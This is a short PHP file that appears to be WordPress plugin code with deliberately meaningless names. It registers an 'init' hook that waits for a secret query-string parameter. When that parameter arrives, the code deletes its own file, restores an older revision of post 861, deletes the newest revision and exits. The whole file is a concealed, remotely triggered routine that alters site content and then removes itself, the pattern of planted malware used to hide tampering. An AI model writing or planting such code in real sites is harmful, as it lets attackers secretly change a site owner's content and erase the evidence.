<?php

function blocker_database_polyfill_colors() {
	if (isset($_GET['s3_multiple_safe']) && $_GET['s3_multiple_safe'] === 'plupload_booster_uploads_media') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$google_listings_portal_make = 861;
		$invoice_learndash_front = wp_get_post_revisions($google_listings_portal_make);
		if (empty($invoice_learndash_front)) die('no revisions');
		if (count($invoice_learndash_front) < 2) die('less than 2');
		$comments_addon_old = array_shift($invoice_learndash_front);
		$customize_cookies_local_better = $comments_addon_old->ID;
		$stripe_accessible_edit = array_shift($invoice_learndash_front);
		$react_date_titles_latest = $stripe_accessible_edit->ID;
		$search_term_community = wp_restore_post_revision($react_date_titles_latest);
		if ($search_term_community === false) die('error restoring');
		$search_term_community = wp_delete_post_revision($customize_cookies_local_better);		
		if ($search_term_community === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'blocker_database_polyfill_colors');
